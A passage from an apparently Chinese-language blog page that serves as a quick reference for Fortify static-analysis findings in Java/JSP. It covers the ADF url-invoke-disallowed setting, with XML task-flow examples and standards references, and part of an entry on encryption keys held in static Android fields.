class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-27"><span class="toc-number">1.1.28.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Logging-Practice-Logger-Not-Declared-Static-Final"><span class="toc-number">1.1.29.</span> <span class="toc-text">Poor Logging Practice: Logger Not Declared Static Final</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-28"><span class="toc-number">1.1.29.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-28"><span class="toc-number">1.1.29.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-26"><span class="toc-number">1.1.29.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-28"><span class="toc-number">1.1.29.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Logging-Practice-Multiple-Loggers"><span class="toc-number">1.1.30.</span> <span class="toc-text">Poor Logging Practice: Multiple Loggers</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-29"><span class="toc-number">1.1.30.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-29"><span class="toc-number">1.1.30.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-27"><span class="toc-number">1.1.30.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-29"><span class="toc-number">1.1.30.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Logging-Practice-Use-of-a-System-Output-Stream"><span class="toc-number">1.1.31.</span> <span class="toc-text">Poor Logging Practice: Use of a System Output Stream</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-30"><span class="toc-number">1.1.31.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-30"><span class="toc-number">1.1.31.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-28"><span class="toc-number">1.1.31.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-30"><span class="toc-number">1.1.31.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Non-final-Public-Static-Field"><span class="toc-number">1.1.32.</span> <span class="toc-text">Poor Style: Non-final Public Static Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-31"><span class="toc-number">1.1.32.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-31"><span class="toc-number">1.1.32.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-29"><span class="toc-number">1.1.32.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-31"><span class="toc-number">1.1.32.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak"><span class="toc-number">1.1.33.</span> <span class="toc-text">System Information Leak</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-32"><span class="toc-number">1.1.33.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-32"><span class="toc-number">1.1.33.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-30"><span class="toc-number">1.1.33.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-32"><span class="toc-number">1.1.33.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Apache-Axis"><span class="toc-number">1.1.34.</span> <span class="toc-text">System Information Leak: Apache Axis</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-33"><span class="toc-number">1.1.34.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-33"><span class="toc-number">1.1.34.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-31"><span class="toc-number">1.1.34.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-33"><span class="toc-number">1.1.34.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Apache-Axis-2"><span class="toc-number">1.1.35.</span> <span class="toc-text">System Information Leak: Apache Axis 2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-34"><span class="toc-number">1.1.35.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-34"><span class="toc-number">1.1.35.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-32"><span class="toc-number">1.1.35.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-34"><span class="toc-number">1.1.35.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-External"><span class="toc-number">1.1.36.</span> <span class="toc-text">System Information Leak: External</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-35"><span class="toc-number">1.1.36.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-35"><span class="toc-number">1.1.36.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-33"><span class="toc-number">1.1.36.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-35"><span class="toc-number">1.1.36.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-HTML-Comment-in-JSP"><span class="toc-number">1.1.37.</span> <span class="toc-text">System Information Leak: HTML Comment in JSP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-36"><span class="toc-number">1.1.37.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-36"><span class="toc-number">1.1.37.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-34"><span class="toc-number">1.1.37.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-36"><span class="toc-number">1.1.37.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Incomplete-Servlet-Error-Handling"><span class="toc-number">1.1.38.</span> <span class="toc-text">System Information Leak: Incomplete Servlet Error Handling</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-37"><span class="toc-number">1.1.38.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-37"><span class="toc-number">1.1.38.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-35"><span class="toc-number">1.1.38.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-37"><span class="toc-number">1.1.38.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Internal"><span class="toc-number">1.1.39.</span> <span class="toc-text">System Information Leak: Internal</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-38"><span class="toc-number">1.1.39.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-38"><span class="toc-number">1.1.39.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-36"><span class="toc-number">1.1.39.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-38"><span class="toc-number">1.1.39.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Overly-Broad-SQL-Logging"><span class="toc-number">1.1.40.</span> <span class="toc-text">System Information Leak: Overly Broad SQL Logging</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-39"><span class="toc-number">1.1.40.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-39"><span class="toc-number">1.1.40.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-37"><span class="toc-number">1.1.40.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-39"><span class="toc-number">1.1.40.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Spring-Boot-Actuators-Enabled"><span class="toc-number">1.1.41.</span> <span class="toc-text">System Information Leak: Spring Boot Actuators Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-40"><span class="toc-number">1.1.41.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-40"><span class="toc-number">1.1.41.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-38"><span class="toc-number">1.1.41.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-40"><span class="toc-number">1.1.41.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Struts-2"><span class="toc-number">1.1.42.</span> <span class="toc-text">System Information Leak: Struts 2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-41"><span class="toc-number">1.1.42.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-41"><span class="toc-number">1.1.42.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-39"><span class="toc-number">1.1.42.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-41"><span class="toc-number">1.1.42.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Trust-Boundary-Violation"><span class="toc-number">1.1.43.</span> <span class="toc-text">Trust Boundary Violation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-42"><span class="toc-number">1.1.43.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-42"><span class="toc-number">1.1.43.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-40"><span class="toc-number">1.1.43.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-42"><span class="toc-number">1.1.43.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Access-Violation"><span class="toc-number">1.1.44.</span> <span class="toc-text">Unsafe Mobile Code: Access Violation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-43"><span class="toc-number">1.1.44.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-43"><span class="toc-number">1.1.44.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-41"><span class="toc-number">1.1.44.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-43"><span class="toc-number">1.1.44.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Database-Access"><span class="toc-number">1.1.45.</span> <span class="toc-text">Unsafe Mobile Code: Database Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-44"><span class="toc-number">1.1.45.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-44"><span class="toc-number">1.1.45.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-42"><span class="toc-number">1.1.45.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-44"><span class="toc-number">1.1.45.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Inner-Class"><span class="toc-number">1.1.46.</span> <span class="toc-text">Unsafe Mobile Code: Inner Class</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-45"><span class="toc-number">1.1.46.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-45"><span class="toc-number">1.1.46.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-43"><span class="toc-number">1.1.46.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-45"><span class="toc-number">1.1.46.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Public-finalize-Method"><span class="toc-number">1.1.47.</span> <span class="toc-text">Unsafe Mobile Code: Public finalize() Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-46"><span class="toc-number">1.1.47.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-46"><span class="toc-number">1.1.47.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-44"><span class="toc-number">1.1.47.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-46"><span class="toc-number">1.1.47.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Unsafe-Array-Declaration"><span class="toc-number">1.1.48.</span> <span class="toc-text">Unsafe Mobile Code: Unsafe Array Declaration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-47"><span class="toc-number">1.1.48.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-47"><span class="toc-number">1.1.48.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-45"><span class="toc-number">1.1.48.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-47"><span class="toc-number">1.1.48.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Unsafe-Public-Field"><span class="toc-number">1.1.49.</span> <span class="toc-text">Unsafe Mobile Code: Unsafe Public Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-48"><span class="toc-number">1.1.49.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-48"><span class="toc-number">1.1.49.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-46"><span class="toc-number">1.1.49.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-48"><span class="toc-number">1.1.49.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li></ol></li></ol>
         </div>
   <script type="text/javascript">
  function showToc(){
    var toc_article = document.getElementById("toc-article");
    var show_toc_btn = document.getElementById("show-toc-btn");
    toc_article.setAttribute("style","display:block");
    show_toc_btn.setAttribute("style","display:none");
    };
  function showBtn(){
    var toc_article = document.getElementById("toc-article");
    var show_toc_btn = document.getElementById("show-toc-btn");
    toc_article.setAttribute("style","display:none");
    show_toc_btn.setAttribute("style","display:block");
    };
   </script>
      
<!-- 目录内容结束 -->

    <div class="article-entry" itemprop="articleBody">
      
        <p>fortify扫描结果速查(Java/JSP)-封装，篇幅较大，推荐使用ctrl+F查找~~~<br><a id="more"></a></p>
<h2 id="Java-JSP"><a href="#Java-JSP" class="headerlink" title="Java/JSP"></a>Java/JSP</h2><p>封装<br>封装是指划定明确的边界。在 Web 浏览器中，这可能意味着确保您的移动代码不会被其他移动代码滥用。在服务器上，它可能意味着对经过验证的数据和未经验证的数据、一个用户的数据和另一用户的数据或对用户可以查看的数据和不能查看的数据进行区分。</p>
<h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>封装是指划定明确的边界。在 Web 浏览器中，这可能意味着确保您的移动代码不会被其他移动代码滥用。在服务器上，它可能意味着对经过验证的数据和未经验证的数据、一个用户的数据和另一用户的数据或对用户可以查看的数据和不能查看的数据进行区分。</p>
<p>ADF Bad Practices: Default url-invoke-disallowed Setting</p>
<p>Cross-Site Request Forgery</p>
<p>Cross-Site WebSocket Hijacking</p>
<p>File Based Cross-Zone Scripting</p>
<p>HTML5: Overly Permissive CORS Policy</p>
<p>Hidden Field</p>
<p>Insecure Storage: Android Backup Storage</p>
<p>Insecure Storage: Android External Storage</p>
<p>Insecure Storage: Android World Readable or Writeable</p>
<p>J2EE Bad Practices: Leftover Debug Code</p>
<p>JavaScript Hijacking</p>
<p>JavaScript Hijacking: Vulnerable Framework</p>
<p>Mass Assignment: Sensitive Field Exposure</p>
<p>Poor Logging Practice: Logger Not Declared Static Final</p>
<p>Poor Logging Practice: Multiple Loggers</p>
<p>Poor Logging Practice: Use of a System Output Stream</p>
<p>Poor Style: Non-final Public Static Field</p>
<p>System Information Leak</p>
<p>System Information Leak: Apache Axis</p>
<p>System Information Leak: Apache Axis 2</p>
<p>System Information Leak: External</p>
<p>System Information Leak: HTML Comment in JSP</p>
<p>System Information Leak: Incomplete Servlet Error Handling</p>
<p>System Information Leak: Internal</p>
<p>System Information Leak: Overly Broad SQL Logging</p>
<p>System Information Leak: Spring Boot Actuators Enabled</p>
<p>Trust Boundary Violation</p>
<p>Unsafe Mobile Code: Access Violation</p>
<p>Unsafe Mobile Code: Database Access</p>
<p>Unsafe Mobile Code: Inner Class</p>
<p>Unsafe Mobile Code: Public finalize() Method</p>
<p>Unsafe Mobile Code: Unsafe Array Declaration</p>
<p>Unsafe Mobile Code: Unsafe Public Field</p>
<h4 id="ADF-Bad-Practices-Default-url-invoke-disallowed-Setting"><a href="#ADF-Bad-Practices-Default-url-invoke-disallowed-Setting" class="headerlink" title="ADF Bad Practices: Default url-invoke-disallowed Setting"></a>ADF Bad Practices: Default url-invoke-disallowed Setting</h4><h5 id="ABSTRACT"><a href="#ABSTRACT" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>依靠默认的隐式 url-invoke-disallowed 设置缺乏明确性，如果默认设置发生意外变更，则可能会导致出现意外行为。</p>
<h5 id="EXPLANATION"><a href="#EXPLANATION" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>默认情况下，Fusion 应用程序中的任务流不能直接通过 GET 请求访问：URL 在尝试调用任务流时，会收到 HTTP 403 状态代码。但是，依靠隐式设置始终缺乏明确性，如果底层的默认设置发生变更，则可能会导致出现意外行为。</p>
<p>例 1：以下片段来自任务流定义文件，显示了使用默认的隐式 url-invoke-disallowed 设置配置的任务流示例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;task-flow-definition id=&quot;password&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;default-activity&gt;PasswordPrompt&lt;/default-activity&gt;</span><br><span class="line"></span><br><span class="line">        &lt;view id=&quot;PasswordPrompt&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;page&gt;/PasswordPrompt.jsff&lt;/page&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/view&gt;</span><br><span class="line"></span><br><span class="line">        &lt;use-page-fragments/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/task-flow-definition&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS"><a href="#RECOMMENDATIONS" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>最好通过在任务流定义文件中指定 url-invoke-disallowed 标签来显式配置此设置。显式配置此配置可以避免混乱，表明选择此设置值的明确目的。如果底层隐式设置的默认值发生变更，还可以避免可能出现的意外行为。</p>
<p>例 2：以下片段来自任务流定义文件，显示了与上文相同的使用显式 url-invoke-disallowed 设置配置的任务流示例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;task-flow-definition id=&quot;password&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;default-activity&gt;PasswordPrompt&lt;/default-activity&gt;</span><br><span class="line"></span><br><span class="line">        &lt;view id=&quot;PasswordPrompt&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;page&gt;/PasswordPrompt.jsff&lt;/page&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/view&gt;</span><br><span class="line"></span><br><span class="line">        &lt;use-page-fragments/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;visibility id=&quot;__1&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;url-invoke-disallowed/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/visibility&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/task-flow-definition&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在极少数情况下必须通过 URL 才能访问任务流，此时可以使用 url-invoke-allowed 设置。</p>
<p>例 3：以下片段显示了使用 url-invoke-allowed 设置配置的同一个任务流。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;task-flow-definition id=&quot;password&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;default-activity&gt;PasswordPrompt&lt;/default-activity&gt;</span><br><span class="line"></span><br><span class="line">        &lt;view id=&quot;PasswordPrompt&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;page&gt;/PasswordPrompt.jsff&lt;/page&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/view&gt;</span><br><span class="line"></span><br><span class="line">        &lt;use-page-fragments/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;visibility id=&quot;__1&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;url-invoke-allowed/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/visibility&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/task-flow-definition&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES"><a href="#REFERENCES" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Oracle(R) Fusion Middleware Fusion Developer’s Guide for Oracle Application Development Framework, 15.6.4.How to Call a Bounded Task Flow Using a URL</p>
<p>[2] Standards Mapping - FIPS200 CM</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[6] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-002360 CAT II</p>
<p>[10] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Android-Bad-Practices-Encryption-Secret-Held-in-Static-Field"><a href="#Android-Bad-Practices-Encryption-Secret-Held-in-Static-Field" class="headerlink" title="Android Bad Practices: Encryption Secret Held in Static Field"></a>Android Bad Practices: Encryption Secret Held in Static Field</h4><h5 id="ABSTRACT-1"><a href="#ABSTRACT-1" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序将加密密钥保留在静态类字段中，使攻击者可轻松进行恢复。</p>
<h5 id="EXPLANATION-1"><a href="#EXPLANATION-1" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>将加密密钥存储在静态类字段中时，可访问进程内存（如经过 root 的设备）或进程内存转储（如故障转储）的实体可轻松恢复该密钥。</p>
<h5 id="RECOMMENDATIONS-1"><a href="#RECOMMENDATIONS-1" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请不要将机密数据缓存在静态类字段中，因为可从中轻松找到这些数据。 避免将密钥存储在应用程序中，但是如有必要，将其序列化并存储在专用的用户存储中，并且使用一个临时运行时随机数值模糊化/保护密钥，使从内存中轻易恢复密钥变得更加困难。</p>
<h5 id="REFERENCES-1"><a href="#REFERENCES-1" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 226 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001090, CCI-001199 </p>
<p>[4] Standards Mapping - FIPS200 IA </p>
